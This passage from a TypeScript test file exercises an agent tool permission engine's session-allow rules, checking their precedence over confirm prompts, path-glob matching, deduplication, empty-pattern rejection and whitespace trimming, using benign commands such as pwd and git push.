    eng.addSessionAllow('fetch_url', 'api.example.com');
    const d = eng.check('fetch_url', 'web.fetch', { url: 'https://api.example.com/v1' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({
      layer: 'session',
      rule: 'api.example.com',
      section: 'fetch_url',
    });
  });

  test('search-tool session-allow follows the same root-descends-into-glob semantics', () => {
    // grep rooted at `src` against allow `src/**` works because the
    // engine probes `src/<synthetic>` against the rule. Session-allow
    // funnels through the same matchTarget — so the runtime
    // promotion behaves identically to a base allow_paths entry.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('grep', 'src/**');
    expect(eng.check('grep', 'fs.read', { path: 'src' }).kind).toBe('allow');
  });

  test('session-allow runs BEFORE base confirm rules (skips the modal)', () => {
    // Without session-allow the request would confirm. Operator's
    // session-allow short-circuits past the confirm — that's the
    // ergonomics win.
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: CWD,
    });
    expect(eng.check('bash', 'bash', { command: 'git push origin main' }).kind).toBe('confirm');
    eng.addSessionAllow('bash', 'git push *');
    expect(eng.check('bash', 'bash', { command: 'git push origin main' }).kind).toBe('allow');
  });

  test('duplicate addSessionAllow calls do not grow the list', () => {
    // Operator may answer session-allow on the same rule twice
    // (different runs of the same agent step, modal racing, etc.).
    // The dedup keeps the list bounded across long sessions and
    // preserves the original rule's diagnostic position.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', 'pwd');
    eng.addSessionAllow('bash', 'pwd');
    eng.addSessionAllow('bash', 'pwd');
    // Internal state isn't introspectable, but a successful match
    // proves the rule is there. The dedup is a hygiene property —
    // we exercise it via repeated calls to lock in that the API
    // accepts repeats without throwing.
    expect(eng.check('bash', 'bash', { command: 'pwd' }).kind).toBe('allow');
  });

  test('empty pattern is silently dropped', () => {
    // Defense-in-depth: bridge should never call us with empty
    // pattern, but if it does, the engine refuses to register a
    // rule that could be silently expanded into `*` by a future
    // refactor. Subsequent check default-denies as if no rule
    // had been added.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', '');
    eng.addSessionAllow('bash', '   ');
    expect(eng.check('bash', 'bash', { command: 'pwd' }).kind).toBe('deny');
  });

  test('session-allow whitespace is trimmed before storage', () => {
    // The bridge takes patterns from PolicySource.rule which
    // originates from policy YAML; in principle whitespace is
    // already normalized, but loose user input through future
    // entry points (REPL command, hooks) could carry it. Trim
    // defensively so the matcher behaves the same regardless.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('bash', '  pwd  ');
    expect(eng.check('bash', 'bash', { command: 'pwd' }).kind).toBe('allow');
  });
});
